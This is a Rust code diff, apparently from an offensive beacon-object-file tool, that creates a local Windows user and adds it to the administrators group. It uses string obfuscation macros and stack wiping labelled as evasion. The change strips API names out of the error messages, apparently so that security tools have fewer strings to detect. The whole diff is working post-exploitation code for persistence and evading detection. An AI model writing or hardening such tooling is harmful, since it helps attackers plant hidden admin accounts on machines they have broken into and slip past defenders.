@@ -101,7 +101,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     let mut parm_err: u32 = 0;
     let rc = unsafe {
         net_user_add(core::ptr::null(), 1, &info as *const UserInfo1 as *const u8, &mut parm_err)
-    }.map_err(|_| "NetUserAdd resolve")?;
+    }.map_err(|_| "resolve")?;
 
     // Wipe password from stack as soon as we no longer need it.
     let pass_bytes = unsafe {
@@ -110,7 +110,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     common::evasion::secure_zero(pass_bytes);
 
     if rc != NERR_SUCCESS {
-        return Err("NetUserAdd failed (already exists / weak pw / no admin?)");
+        return Err("user add failed");
     }
     obf! { let ok = "user created"; }
     println!("[+] {}: {}", ok, user_ascii);
@@ -135,9 +135,9 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
                 core::ptr::null(), grp_w.as_ptr(), 3,
                 &mem as *const LocalGroupMembersInfo3 as *const u8, 1,
             )
-        }.map_err(|_| "NetLocalGroupAddMembers resolve")?;
+        }.map_err(|_| "resolve")?;
         if rc2 != NERR_SUCCESS {
-            return Err("NetLocalGroupAddMembers failed (admin add)");
+            return Err("group add failed");
         }
         obf! { let ok2 = "added to admins"; }
         println!("[+] {}", ok2);
